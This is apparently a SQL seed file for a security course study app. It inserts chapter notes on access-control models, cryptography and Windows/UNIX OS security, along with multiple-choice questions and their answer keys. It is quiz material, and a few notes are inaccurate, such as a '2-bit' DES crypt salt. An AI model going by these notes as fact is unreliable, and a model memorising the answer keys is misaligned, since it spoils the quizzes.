INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'What are the three aspects that contend with each other in an information-hiding system?', '["Security, Robustness, Capacity","Identification, Authentication, Authorisation","Correctness, Impersonation prevention, Transferability protection","Confidentiality, Integrity, Availability"]', 0, 'Security, Robustness, and Capacity.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'What are the three main objectives of authentication?', '["Correctness, Impersonation prevention, Protection against transferability","Something you know, have, are","Confidentiality, Integrity, Availability","Identification, Authentication, Authorisation"]', 0, 'Correctness, Impersonation prevention, and Protection against transferability.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), '"Signature dynamics" falls under which category of user authentication?', '["Something you are (behavioral characteristics)","Something you know","Something you trust","Something you have"]', 0, '"Something you are" (behavioral characteristics).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'State the exact logical condition for the Bell-LaPadula "Simple Security Property" (ss-Property) regarding reading an object.', '["Subject s can write object o iff L(o) <= L(s)","Subject s can read object o iff L(o) <= L(s) and s may read o","Subject s can read object o iff L(s) <= L(o)","Subject s can read object o iff levels are equal"]', 1, 'Subject $s$ can read object $o$ iff $L(o) \le L(s)$ and $s$ has permission to read $o$.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'What does the "Integrity confinement" rule state in the Biba model?', '["A subject can write an object only if I(S) >= I(O)","A subject can read an object only if I(S) >= I(O)","A subject can read an object only if I(S) <= I(O)","A subject can invoke another only if I(S1) >= I(S2)"]', 2, 'A subject can read an object only if $I(S) \le I(O)$.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'In the context of access control structures, what is the disadvantage of using a Capability List (C-List) over an ACL?', '["It cannot authenticate users","It stores passwords in plaintext","It only supports one object","Poor overview of access rights per object and difficult revocation"]', 3, 'It offers a poor overview of access rights per object and makes revocation difficult.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'What is the fundamental difference between Discretionary Access Control (DAC) and Mandatory Access Control (MAC)?', '["In DAC the resource owner controls access; in MAC rights are fixed centrally by an administrator","In DAC an administrator controls access; in MAC the owner does","Both are owner-controlled","DAC applies to files; MAC applies to users"]', 0, 'In DAC, access control is carried out by the resource owner. In MAC, access rights are fixed centrally by an administrator via a system-wide policy.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'What is a "Protection ring" and what occupies Ring 0?', '["A capability list; Ring 0 holds user processes","A list of user passwords; Ring 0 is the admin","A conflict of interest class; Ring 0 is services","A hierarchy of access right levels; Ring 0 is the OS kernel"]', 3, 'A hierarchy of access right levels; Ring 0 is occupied by the operating system kernel.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'Identify the three core requirements of a Reference Monitor.', '["Confidentiality, Integrity, Availability","Speed, Simplicity, Scalability","Tamper-resistance, Complete mediation, Easiness of verification and testing","Identification, Authentication, Authorisation"]', 2, 'Tamper-resistance, Complete mediation (guaranteed invocation), and Easiness of verification and testing.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'Which formal security model actively relies on "Conflict of Interest" (COI) classes?', '["The Chinese Wall model","Role Based Access Control","The Biba model","The Bell-LaPadula model"]', 0, 'The Chinese Wall model.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'Define "Role Based Access Control" (RBAC) according to the slides.', '["Access control carried out by the resource owner","A logical layer linking users and resources based on the need or circumstances of access","Centralised access fixed by an administrator","Explicit revocation of access rights"]', 1, 'A "logical" layer that links users and allowed resources based on the need or circumstances in which a user needs a resource.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'What is the Biba Invocation property?', '["A subject can invoke another subject only if I(S1) >= I(S2)","A subject can read only if I(S) <= I(O)","A subject can write only if I(S) <= I(O)","A subject can read only if L(o) <= L(s)"]', 0, 'A subject can invoke another subject only if $I(S_1) \ge I(S_2)$.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'What four steps make up the Resource Access sequence?', '["Identification, Authentication, Authorization, Accountability","Confidentiality, Integrity, Availability, Privacy","Subject, Object, Reference Monitor, Group","Login, Request, Ticket, Accept"]', 0, 'Identification, Authentication, Authorization, and Accountability.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'What are the five placement levels for a Reference Monitor?', '["Ring 0, 1, 2, 3, 4","Kernel, Hardware, Services, OS, Applications","Hardware, OS kernel, Operating system, Services, Applications","Identification, Authentication, Authorization, Accountability, Audit"]', 2, 'Hardware, OS kernel, Operating system, Services, and Applications.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'Does the Bell-LaPadula *-Property allow "writes up" or "writes down"?', '["Both writes up and down","Writes down","Neither writes up nor down","Writes up"]', 3, 'It allows "writes up" but disallows "writes down".');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'In the Kerberos protocol, what happens immediately after the client generates Authenticator U (Step 5)?', '["Step 6: Send TGS","Step 1: Login","Step 4: Send TGT","Step 8: Send Service Ticket"]', 0, 'Step 6: Send TGS.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'What does "Negative permission" mean in access control abstractions?', '["A mapping of users to access rights","Explicit revocation of access rights","A hierarchy of protection rings","A collection of related subjects"]', 1, 'It is the explicit revocation of access rights.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'A subject with a ''Secret'' clearance wants to read a file classified as ''Top Secret''. According to the Bell-LaPadula model, what specific property blocks this action, and what is its informal name?', '["The Simple Security Property (ss-Property), informally \"no reads up\"","The Biba simple integrity rule","The *-Property, informally \"no writes down\"","The Chinese Wall *-property"]', 0, 'The Simple Security Property (ss-Property) blocks this action, informally known as the "no reads up" rule.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 2 AND variant = 'extended'), 'A consultant reads an unsanitised file belonging to Domino''s. She then attempts to read a file belonging to Pizza Hut (which is in the same Conflict of Interest class), and attempts to write to a file belonging to Ford Motors (a different COI class). According to the Chinese Wall model, which actions are blocked, and why?', '["Only the Ford write is blocked","Neither action is blocked","Only the Pizza Hut read is blocked","Reading Pizza Hut is blocked by the simple rule; writing to Ford is blocked by the *-property"]', 3, 'Both actions are blocked. Reading the Pizza Hut file is blocked by the Simple Security Rule (she has already accessed a competitor in the same COI class). Writing to the Ford Motors file is blocked by the *-property (she has read unsanitised information in a different company dataset—Domino''s).');

INSERT INTO chapters (number, title, variant, content_md) VALUES (3, 'Cryptography', 'extended', '**1. Overview**
This chapter covers the evolution and mechanics of cryptography, bridging classical substitution and transposition methods with modern computational algorithms like DES, AES (Rijndael), and stream ciphers. It expands into the theoretical foundations of secrecy (Shannon''s principles of Confusion and Diffusion), asymmetric (public-key) frameworks, cryptographic hash functions, and the Public Key Infrastructure (PKI) required to manage trust at scale. This matters because cryptography is the mathematical engine enabling core information security objectives: guaranteeing confidentiality, detecting malicious alterations (integrity), preventing masquerading (authentication), and ensuring users cannot deny their actions (non-repudiation).

**2. Key Terms**
*   **Cryptography:** In cryptography, the meaning of the message is hidden, not its existence [031 Slide 2/31].
*   **Confusion:** Obscuring the statistical dependence between the encryption key and the ciphertext [031 Slide 26/31].
*   **Diffusion:** Obscuring the statistical structure of the plaintext from the ciphertext [031 Slide 26/31].
*   **Feistel Network:** A symmetric structure used in block ciphers that halves the plaintext and uses multiple rounds of substitution and permutation governed by a sub-key [032 Slide 1/10].
*   **S-Box (Substitution Box):** A complex, key-controlled substitution mechanism designed to introduce non-linearity into a cipher [032 Slide 5/10].
*   **Avalanche Effect:** A diffusion property where a 1-bit difference in plaintext or key quickly results in a large difference in ciphertext bits [033 Slide 3/16].
*   **Hash Function:** Converts a large, variable-size input into a small, fixed-size output [037 Slide 2/19].
*   **Digital Certificate:** A binding between an entity name and its public key, issued and digitally signed by a trusted third party [038 Slides 9/26, 11/26].
*   **Public Key Infrastructure (PKI):** The set of hardware, software, people, policies, and procedures needed to create, manage, store, distribute, and revoke Public Key Certificates [038 Slide 7/26].
*   **Arbitrated Protocol:** A protocol where a trusted third party helps in real time to ensure a transaction can be trusted [035 Slide 8/16].
*   **Adjudicated Protocol:** A protocol where a trusted third party is involved only if needed and after the fact (e.g., in a dispute) [035 Slide 9/16].

**3. Processes & Models**

**Feistel Network Round Structure**
1. Inputs: $L_i$ and $R_i$; $K_i$ is derived from K (sub-key).
2. $L_{i+1} = R_i$
3. $R_{i+1} = L_i \oplus F(R_i, K_i)$

**DES One-Round Transformation**
1. Expansion of $R_i$ from 32 to 48 bits (some bits are duplicated).
2. 48 bits are XORed with $K_i$.
3. Substitution, using 8 S-Boxes with 6-bit input and 4-bit output.
4. 32 bits are permuted according to specified P-Box.
5. 32 bits are XORed with $L_i$ to create $R_{i+1}$.

**Rijndael (AES) Round Structure**
1. Non-linear layer (uses optimized S-boxes for confusion).
2. Linear mixing layer (Row shifts on the state matrix for diffusion).
3. Linear mixing layer (Column mixes on the state matrix for diffusion).
4. Key addition layer (using a simple XOR).

**Validating a Digital Signature**
1. Re-compute the hash value.
2. Obtain the author’s public key.
3. Decrypt the original hash (the signature).
4. Compare hash values – if match signature is valid.

**4. Most Examinable Points**
*   **You must know** the classification of cryptography: Processing (Stream vs Block), Key (Asymmetric vs Symmetric), and Method (Transposition vs Substitution).
*   **You must know** that the *One Time Pad* is the only perfectly secure encryption algorithm (probability function remains uniform), using a random stream of letters where every letter is used only once.
*   **You must know** Shannon''s principles: Confusion (achieved via substitution) and Diffusion (achieved via transposition/permutation).
*   **You must know** the difference between Passive attacks (eavesdropping, traffic analysis - difficult to detect, should be prevented) and Active attacks (masquerade, replay, modification, DoS - difficult to prevent, should be detected).
*   **You must know** the symmetric key distribution vulnerability known as the $N \times (N-1)/2$ problem; as the network grows, sharing unique secret keys between every pair of users becomes unmanageable.
*   **You must know** the three collision requirements for secure hash functions: Preimage resistance (computationally infeasible to find $M$ such that $D = h(M)$), Second preimage resistance (infeasible to find $M'' \ne M$ such that $D = h(M'')$), and Collision resistance (infeasible to find any pair $M_1, M_2$ such that $h(M_1) = h(M_2)$).
*   **You must know** the Birthday Paradox implies that for an ideal hash function with output size $n$, a collision attack only requires $2^{n/2}$ operations (whereas a brute force second-preimage attack requires $2^n$ operations).
*   **You must know** that a digital signature provides *Data Integrity* and *Non-repudiation*, but it does *not* provide confidentiality.
*   **You must know** that 3DES (Triple DES) uses three 56-bit keys and operates in an Encrypt-Decrypt-Encrypt sequence: $C = E_{k3}(D_{k2}(E_{k1}(P)))$.
*   **You must know** the components of PKI: Certification Authority (CA, issues and signs certificates), Registration Authority (RA, identity proofing), Users/Subscriber, and the Repository/Archive (stores certificates and CRLs).

**5. Common Mistakes**
*   **Confusing Confusion and Diffusion:** Students frequently mix these up. Remember: *Confusion* is tied to Substitution (obscuring the key-to-ciphertext relationship). *Diffusion* is tied to Transposition/Permutation (obscuring the plaintext-to-ciphertext relationship).
*   **Misunderstanding Digital Signatures:** Students often think a digital signature means encrypting the entire document with a private key. It does not. It only encrypts the *hash (digest)* of the document to save computational resources.
*   **Confusing Asymmetric Key Uses:** Encrypting with a public key is for *confidentiality* (only the recipient can decrypt with their private key). Encrypting with a private key is for *digital signatures/non-repudiation* (anyone can verify with the public key, proving authorship).
*   **Assuming AES uses a Feistel structure:** AES (Rijndael) explicitly does *not* use a Feistel structure. It uses a state matrix with independent non-linear, linear mixing, and key addition operations.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'What is the mathematical formula illustrating the scalability problem of symmetric key distribution?', '["N - 1","2^N","N x N","N x (N - 1) / 2"]', 3, '$N \times (N - 1) / 2$.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'Name the three classifications of cryptography based on ''Method'', ''Key'', and ''Processing''.', '["Confusion, Diffusion, Avalanche","Hash, Salt, Key","DES, AES, RSA","Method (Transposition/Substitution), Key (Asymmetric/Symmetric), Processing (Stream/Block)"]', 3, 'Method (Transposition/Substitution), Key (Asymmetric/Symmetric), and Processing (Stream/Block).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'What mathematical operation is used in a Feistel cipher to combine $L_i$ with the output of $F(R_i, K_i)$?', '["Bit rotation","Modular addition","XOR (Exclusive OR)","AND"]', 2, 'XOR (Exclusive OR).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'What are the input and output bit sizes of a DES S-box?', '["8-bit input and 8-bit output","4-bit input and 6-bit output","32-bit input and 48-bit output","6-bit input and 4-bit output"]', 3, '6-bit input and 4-bit output.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'What is the 3DES (Triple DES) equation for encryption using three keys?', '["C = D_k1(E_k2(D_k3(P)))","C = E_k3(D_k2(E_k1(P)))","C = E_k1(D_k2(P))","C = E_k1(E_k2(E_k3(P)))"]', 1, '$C = E_{k3}(D_{k2}(E_{k1}(P)))$.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'According to Shannon''s theory, what is the only perfectly secure encryption algorithm?', '["3DES","The Feistel cipher","The One Time Pad","Rijndael (AES)"]', 2, 'The One Time Pad.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'Does the Rijndael (AES) algorithm use a Feistel structure?', '["No; it uses only transposition","No; it uses a state matrix with non-linear, mixing, and key addition layers","Yes; it is a Feistel network","Yes; like DES it splits the block in halves"]', 1, 'No, it uses a state matrix with non-linear, linear mixing, and key addition layers.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'Define "Preimage resistance" for a hash function.', '["It is infeasible to find any two messages with the same hash","It is infeasible to find M'' != M with the same hash","For a given D it is infeasible to find M such that D = h(M)","It is infeasible to compute the hash"]', 2, 'For any given value $D$, it is computationally infeasible to find $M$ such that $D = h(M)$.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'According to the Birthday Paradox, how many operations are required to stage a collision attack on an ideal hash function with an output size of $n$?', '["n x (n-1)/2 operations","2^(n/2) operations","n^2 operations","2^n operations"]', 1, '$2^{n/2}$ operations.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'Name the four main components of a Public Key Infrastructure (PKI).', '["Hash, Salt, Certificate, Key","Sender, Receiver, Key, Cipher","Certification Authority, Registration Authority, Users/Subscriber, Repository/Archive","CA, Firewall, VPN, IDS"]', 2, 'Certification Authority (CA), Registration Authority (RA), Users/Subscriber, and Repository/Archive.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'Which PKI component is responsible for verifying certificate contents for the CA (Identity proofing)?', '["The Subscriber","Certification Authority (CA)","Registration Authority (RA)","Repository/Archive"]', 2, 'Registration Authority (RA).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'What two security characteristics does a Digital Signature natively provide?', '["Confidentiality and Integrity","Authentication and Confidentiality","Confidentiality and Availability","Data Integrity and Non-repudiation"]', 3, 'Data Integrity and Non-repudiation.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'What is the fundamental difference between an Active attack and a Passive attack?', '["Active attacks alter resources/operation; Passive attacks only learn information without affecting resources","They are the same","Active attacks only eavesdrop; Passive attacks modify data","Active attacks are undetectable; Passive attacks are preventable"]', 0, 'Active attacks attempt to alter system resources or affect their operation, whereas Passive attacks merely attempt to learn or make use of information without affecting system resources.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'Give two examples of an Active attack.', '["Masquerade and replay","Eavesdropping and traffic analysis","Confusion and diffusion","Snooping and sniffing"]', 0, 'Any two of: masquerade (spoofing), replay, modification (substitution, insertion, destruction), denial of service.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'In what type of cryptographic protocol does a trusted third party only help if needed and after the fact?', '["A Feistel Protocol","An Arbitrated Protocol","An Adjudicated Protocol","A Zero Knowledge Protocol"]', 2, 'An Adjudicated Protocol.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'What does a Certification Authority (CA) publish to list invalid or revoked certificates?', '["The X.509 certificate","Certificate Revocation Lists (CRLs)","The session key archive","The Registration Authority list"]', 1, 'Certificate Revocation Lists (CRLs).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'What specifically does an X.509 digital certificate bind together?', '["A private key to a certificate","A symmetric key to a session","A password to its hash","An entity name to its public key"]', 3, 'It binds an entity name to its public key.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'What does the "Avalanche effect" refer to in conventional cryptography?', '["Substitution that obscures the key relationship","Shrinking of ciphertext per round","A diffusion property where a 1-bit change cascades into large ciphertext differences","The reuse of a one time pad"]', 2, 'It is a diffusion property where a 1-bit difference in the plaintext or the key rapidly results in a large difference in the ciphertext bits.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'Alice wants to send a confidential message to Bob using asymmetric cryptography so that absolutely no one else can read it. Which specific key must Alice use to encrypt the message, and which key will Bob use to decrypt it?', '["A shared symmetric key for both","Alice''s private key to encrypt; Alice''s public key to decrypt","Bob''s public key to encrypt; Bob''s private key to decrypt","Bob''s private key to encrypt; Bob''s public key to decrypt"]', 2, 'Alice must encrypt the message using *Bob''s Public Key*. Bob will then decrypt it using *Bob''s Private Key*.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 3 AND variant = 'extended'), 'Bob receives a digitally signed contract from Sue. To validate the signature, Bob successfully computes the hash of the contract. What must he do with Sue''s public key next, and what determines if the signature is definitively valid?', '["Decrypt with his own private key","Hash Sue''s public key and compare","Encrypt the contract with Sue''s public key","Decrypt the attached hash with Sue''s public key; valid if it matches his computed hash"]', 3, 'Bob must decrypt the original attached hash (the signature) using *Sue''s Public Key*. If the hash value he computed matches the hash value he decrypted, the signature is valid.');

INSERT INTO chapters (number, title, variant, content_md) VALUES (4, 'Operating System Security', 'extended', '**1. Overview**
Chapter Four covers the security architectures, access control mechanisms, and fundamental design philosophies of the Windows and Linux/UNIX operating systems. It matters because it highlights the stark contrast between Windows’ highly granular, centrally managed security frameworks—such as Active Directory, Security Identifiers (SIDs), and Access Tokens—and UNIX’s historically modular approach that lacks a unified security architecture entirely, relying instead on careful administration of user IDs, group IDs, and file permissions. Understanding these OS-level controls is essential for securing system resources against unauthorised access and preventing privilege escalation.

**2. Key Terms**
*   **Security Reference Monitor:** The Windows kernel-mode component responsible for ACL verification [041 Slide 3/23].
*   **Local Security Authority (LSA):** A Windows user-mode process responsible for password verification and change, access tokens, and audit logs [041 Slide 3/23].
*   **Security Accounts Manager (SAM):** The Windows database containing user accounts and password encryption [041 Slide 3/23].
*   **Security Identifier (SID):** A unique, machine-generated code of varying length used to identify principals in Windows [041 Slide 9/23].
*   **Access Token:** A Windows container for a subject''s security credentials that provides a principal/subject mapping, inherited during the creation of new processes [041 Slide 11/23].
*   **Active Directory:** An LDAP-like directory service in Windows used for the organisation of system resources, users, security credentials, and trust management [041 Slide 6/23].
*   **UID / GID (User/Group Identifier):** 16-bit numbers used by UNIX to identify distinct users and groups [042 Slide 7/30].
*   **Inode:** A UNIX data structure pointed to by a directory that describes essential resource properties [042 Slide 12/30].
*   **umask:** A UNIX command that changes default permissions [042 Slide 17/30].
*   **Controlled Invocation:** Setting a special flag indicating that a program can be run under the privilege of its owner rather than that of a calling user [042 Slide 19/30].
*   **SUID (set UID):** A Linux flag allowing all users to run a program (under the owner''s privilege) [042 Slide 20/30].
*   **Sticky Flag:** A Linux directory permission flag ensuring that only an owner (or root) can remove files in a directory [042 Slide 20/30].

**3. Processes & Models**

**ACE (Access Control Entry) Processing Sequence (Windows)**
1. ACEs are processed sequentially.
2. Processing stops if an entry explicitly *denies* any requested access right.
3. Processing also stops once a set of entries explicitly *grants* all requested access rights.

**Object Security Descriptor Structure (Windows)**
1. **Owner SID:** A principal who owns an object.
2. **Primary Group SID:** Included for POSIX compatibility.
3. **DACL:** Specifies who is granted and who is denied access.
4. **SACL:** Specifies a security audit policy.

**UNIX Process Creation & UID Mapping**
1. **fork:** Spawns a new child process identical to the parent except for a new PID.
2. **vfork:** Same as fork except memory is shared between the two processes.
3. **exec family:** Replaces the current process with a new process image.
*Note: The real UID is always inherited from the parent process; the effective UID is either inherited from the parent process or from the owner of the file to be executed.*

**Effective Permission Calculation via umask (Linux)**
1. Identify the default permissions (666 for files, 777 for programs).
2. Identify the specified `umask` mask (e.g., 022).
3. Calculate the bitwise inverse (NOT) of the mask (e.g., NOT(022) = 755).
4. The result is the default permissions ANDed with the inverted mask (e.g., 777 AND 755 yields 755).

**4. Most Examinable Points**
*   **You must know** that UNIX explicitly has *none* (no security architecture); security was not a primary design goal, whereas modularity, portability, and efficiency were.
*   **You must know** the difference between a Windows *Privilege* (which controls access to system resources, like shutting down a system) and an *Access Right* (which describes what one can do to an object). Privileges are *not* access rights!
*   **You must know** the root user in Linux (UID 0) bypasses almost all access control mechanisms, and *any* user name can be mapped to UID 0 to become root.
*   **You must know** how UNIX encrypts passwords: DES prepends a 2-bit salt and converts output to 11 ASCII characters, whereas MD5 has no limit on password size and is indicated by a starting `$1$` in the shadow file.
*   **You must know** the severe security risk of SUID programs: Privilege escalation. If ownership of a script is transferred to root, exploitation automatically receives root privileges.
*   **You must know** the secure mounting options for file systems: `-r` (read-only), `-o nosuid` (turn off SUID flags), `-o noexec` (no program can be run), and `-o nodev` (no device access).
*   **You must know** the missing security features in UNIX: ACLs in general, Data labeling, Mandatory Access Control (MAC), Capabilities (only in some subsets), and Standardized auditing.
*   **You must know** the Windows 10 Security Enhancements: Windows Trusted Boot, Windows Hello, Credential Guard, Device Guard, Enterprise Data Protection, and Windows Defender ATP.

**5. Common Mistakes**
*   **Confusing Privileges and Access Rights in Windows:** Students frequently treat these interchangeably. Remember the slides explicitly state: "Privileges are not access rights!" Privileges are system-wide rights (like locking a page in memory); Access Rights are object-specific (like `WRITE_DAC` on a file).
*   **Miscalculating the Linux umask:** Students often subtract the mask as a normal decimal number. Do not just subtract. Find the bitwise inverse (NOT) of the mask, then AND it with the default permissions. For example, a default of 666 and a mask of 033 results in 644, not 633.
*   **Assuming UNIX was built with security in mind:** Students often assume UNIX is natively secure. The slides emphasize that its primary goals were modularity and efficiency, and its main weakness stems from an open-source implementation yielding a less professional code base.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'Does UNIX have a unified security architecture?', '["Yes; UNIX has a unified, centrally managed architecture","Yes; via Active Directory","No; UNIX explicitly does not have a security architecture","Only on the kernel level"]', 2, 'No! UNIX explicitly does not have a security architecture.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'Which Windows kernel-mode component is responsible for ACL verification?', '["The Local Security Authority (LSA)","The Security Reference Monitor","The Security Accounts Manager (SAM)","Active Directory"]', 1, 'The Security Reference Monitor.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'Which Windows user-mode component contains the accounts database and password encryption?', '["The Access Token","The Security Reference Monitor","The Security Accounts Manager (SAM)","The Local Security Authority (LSA)"]', 2, 'The Security Accounts Manager (SAM).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'What does the acronym SID stand for in Windows security?', '["System Identity Descriptor","Security Identifier","Session ID","Secure Inode Directory"]', 1, 'Security Identifier.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'State the mathematical difference between a UNIX UID and a Windows SID in terms of size/format.', '["Both are fixed 32-bit numbers","A UID is a string; a SID is an integer","A UID is a fixed 16-bit number; a SID is a variable-length machine-generated code","A UID is variable length; a SID is fixed 16-bit"]', 2, 'A UNIX UID is a fixed 16-bit number, whereas a Windows SID is a machine-generated code of varying length (e.g., S-1-5-18).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'What are the four components of a Windows Object Security Descriptor?', '["TGT, TGS, AS, SID","LSA, SAM, SRM, UAC","Owner SID, Primary Group SID, DACL, SACL","UID, GID, inode, umask"]', 2, 'Owner SID, Primary Group SID, DACL, and SACL.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'In Windows, is the ability to "shut down a system" considered a Privilege or an Access Right?', '["A capability","An Access Right","A DACL entry","A Privilege"]', 3, 'A Privilege.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'In Linux, what does the octal permission `644` translate to in text format?', '["rwxr--r--","rw-rw-r--","r--r--r--","rw-r--r-- (owner read/write, group read, others read)"]', 3, '`rw-r--r--` (Owner: read/write, Group: read-only, Others: read-only).');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'What does the "Sticky flag" do when applied to a directory in Linux?', '["It hides the directory contents","Only the file owner (or root) can remove files in that directory","It makes the directory read-only","It runs files under the owner privilege"]', 1, 'It ensures that only the owner of a file (or root) can remove files within that directory.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'Name three security options that can be applied to the Linux `mount` command to restrict external file systems.', '["-r (read-only), -o nosuid, -o noexec, -o nodev","-w, -x, -r, -o exec","-r, -o setuid, -o sticky","-o suid, -o dev, -o exec"]', 0, 'Any three of: `-r` (read-only), `-o nosuid`, `-o noexec`, or `-o nodev`.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'What is the difference between the `fork` and `vfork` commands in UNIX?', '["fork replaces the process image; vfork spawns a child","fork shares memory; vfork creates a copy","They are identical","fork creates an identical child; vfork is the same but shares memory"]', 3, '`fork` spawns a new identical child process, whereas `vfork` is the same but memory is shared between the two processes.');
INSERT INTO questions (chapter_id, prompt, options_json, correct_index, explanation) VALUES ((SELECT id FROM chapters WHERE number = 4 AND variant = 'extended'), 'What is the fundamental difference between the *real* UID and the *effective* UID in a Linux process?', '["They are always identical","Real UID comes from the file owner; effective from the parent","Real UID is inherited from the parent; effective UID may come from the parent or the executed file owner","Effective UID is always 0"]', 2, 'The real UID is always inherited from the parent process, whereas the effective UID can be inherited from the parent OR from the owner of the executed file.');
